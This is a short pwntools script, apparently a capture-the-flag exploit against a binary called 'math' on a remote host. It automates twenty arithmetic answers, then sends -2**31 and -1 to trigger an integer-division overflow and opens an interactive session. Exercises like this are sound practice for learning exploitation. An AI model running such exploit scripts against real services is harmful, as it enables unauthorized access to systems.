from pwn import *

context.log_level="debug"
#io = process("./math")

io = remote("10.212.27.23", 12138)

elf = ELF("./math")

#gdb.attach(io)

for i in range(0, 20):
	s1 = io.recvuntil("numberA = :")
	numa = int(io.recvuntil("\n"))
	s2 = io.recvuntil("numberB = :")
	numb = int(io.recvuntil("\n"))
	s3 = io.recvuntil("b:")
	op = (s3[24:25])
	if op == b'+':
		ans = numa + numb
		io.sendline(str(ans))
	elif op == b'-':
		ans = numa - numb
		io.sendline(str(ans))
	elif op == b'*':
		ans = numa * numb
		io.sendline(str(ans))
	elif op == b'/':
		ans = numa / numb
		io.sendline(str(ans))

string = io.recv()
div1 = -2**31
io.sendline(str(div1))
div2 = -1
io.sendline(str(div2))
io.interactive()
